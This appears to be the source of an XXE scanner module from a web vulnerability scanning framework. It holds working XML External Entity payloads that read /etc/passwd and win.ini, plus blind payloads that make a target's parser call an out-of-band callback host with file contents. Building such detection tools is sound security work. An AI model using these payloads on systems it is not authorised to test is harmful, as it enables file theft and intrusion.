"""
XXEScanner — XML External Entity injection detection with OOB confirmation.

Lifecycle:
  DETECTED:   (not applicable)
  VALIDATED:  In-band or error-based XXE returns file content
  EXPLOITABLE: (not applicable)
  VERIFIED:   OOB callback confirms blind XXE execution

Maturity: Level 4 (OOB-confirmed)
"""

from modules.utils import (
    safe_post, finding, log, Colors, _build_curl,
    VerificationStage,
)
from scanners.base import ScannerBase
from models.evidence import HttpRequestEvidence, ResponseExcerptEvidence, OOBCallbackEvidence

XXE_PAYLOADS = {
    "in_band": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    ],
    "error_based": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexist">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>&xxe;</root>',
    ],
    "oob": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oob}/xxe">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "ftp://{oob}/xxe">%xxe;]><root>test</root>',
    ],
    "blind": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>&send;</root>',
    ],
}

XXE_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "daemon:x:", "bin:x:",
    "www-data:x:", "ROOT", "Administrator",
]


class XXEScanner(ScannerBase):
    SCANNER_NAME = "xxe"
    SCANNER_MATURITY = 4
    TARGET_LEVEL = False

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._oob_registrations: list[tuple[str, str, str]] = []

    def scan(self, target_urls: list[str] | None = None) -> list[dict]:
        oob_host = self.validation.callback_host if self.validation else ""
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        xml_headers = {"Content-Type": "application/xml"}
        xxe_payloads = self._load_payloads("xxe")

        for url in urls:
            if not self._in_scope(url):
                continue
            signals = {"in_band": False, "error": False}
            evidence_parts = []

            for payload in xxe_payloads.get("in_band", XXE_PAYLOADS.get("in_band", [])):
                try:
                    resp = safe_post(self.session, url, payload, self.timeout, headers=xml_headers)
                    if not resp:
                        continue
                    body = resp.text
                    for sig in XXE_SIGNATURES:
                        if sig in body:
                            signals["in_band"] = True
                            evidence_parts.append(f"in_band:{sig}")
                            req_ev = HttpRequestEvidence(method="POST", url=url, curl_command=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=dict(self.session.cookies)))
                            resp_ev = ResponseExcerptEvidence(excerpt=body[:500], length=len(body), context="xxe_in_band")
                            self.evidence_engine.store(req_ev)
                            self.evidence_engine.store(resp_ev)
                            f = finding(
                                vuln_type="XML External Entity (XXE) Injection",
                                url=url, severity="critical",
                                details="In-band XXE: file content returned in response via XML entity",
                                evidence=f"Signature: {sig!r}",
                                request=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=dict(self.session.cookies)),
                                response_excerpt=body[:500],
                                steps_to_reproduce=[f"Send POST request to {url} with XXE payload", f"Observe: {sig}"],
                                verification_stage=VerificationStage.VALIDATED.value,
                            )
                            if f:
                                self.evidence_engine.link_to_finding(req_ev, f.get("fingerprint", ""))
                                self.evidence_engine.link_to_finding(resp_ev, f.get("fingerprint", ""))
                                self._add_finding(f)
                            log(f"  [XXE] In-band {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            break
                    if signals["in_band"]:
                        break
                except Exception:
                    continue

            if not signals["in_band"]:
                for payload in xxe_payloads.get("error_based", XXE_PAYLOADS.get("error_based", [])):
                    try:
                        resp = safe_post(self.session, url, payload, self.timeout, headers=xml_headers)
                        if not resp:
                            continue
                        body = resp.text
                        for sig in XXE_SIGNATURES:
                            if sig in body:
                                signals["error"] = True
                                evidence_parts.append(f"error:{sig}")
                                f = finding(
                                    vuln_type="XML External Entity (XXE) Injection",
                                    url=url, severity="critical",
                                    details="Error-based XXE: file content leaked via parser error message",
                                    evidence=f"Signature: {sig!r}",
                                    request=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=dict(self.session.cookies)),
                                    response_excerpt=body[:500],
                                    steps_to_reproduce=[f"Send POST request to {url} with XXE payload", f"Observe: {sig}"],
                                    verification_stage=VerificationStage.VALIDATED.value,
                                )
                                if f:
                                    self._add_finding(f)
                                log(f"  [XXE Error] {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
                        if signals["error"]:
                            break
                    except Exception:
                        continue

            if oob_host and not signals["in_band"] and not signals["error"]:
                for payload in xxe_payloads.get("oob", XXE_PAYLOADS.get("oob", [])):
                    try:
                        oob_payload = oob_host
                        formatted = payload.replace("{oob}", f"{self.validation.generate_oob_payload()}.{oob_host}" if hasattr(self.validation, "generate_oob_payload") else f"x.{oob_host}")
                        safe_post(self.session, url, formatted, self.timeout, headers=xml_headers, raise_for_status=False)
                        self.validation.register_oob("xxe", formatted, url)
                        self._oob_registrations.append(("xxe", formatted, url))
                    except Exception:
                        continue

        return self._get_findings()

    def finalize(self) -> list[dict]:
        extra: list[dict] = []
        if not self.validation:
            return extra
        confirmed = self.validation.poll_oob()
        for ev in confirmed:
            payload_str = ev.callback_host or ""
            url_str = ""
            for vt, pl, u in self._oob_registrations:
                if payload_str and payload_str in pl:
                    url_str = u
                    break
            f = finding(
                vuln_type="XML External Entity (XXE) Injection",
                url=url_str,
                severity="critical",
                details="Blind XXE confirmed via OOB callback — server parsed XML entity and made external request",
                evidence=f"Callback: {(ev.raw_data or '')[:200]}",
                request=_build_curl("POST", url_str, dict(self.session.headers), data="(XXE payload with OOB DTD)", cookies=dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                response_excerpt="(XXE confirmed via out-of-band callback — XML parser made external request)",
                steps_to_reproduce=[
                    f"Send XXE payload to {url_str}",
                    "Observe OOB callback — confirms XML external entity processing",
                    "Use XXE to read local files or access internal services",
                ],
            )
            if f:
                self.evidence_engine.store(ev)
                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                self._add_finding(f)
                extra.append(f)
            log(f"  [XXE OOB] {url_str}", Colors.RED, verbose_only=True, verbose=self.verbose)
        return extra
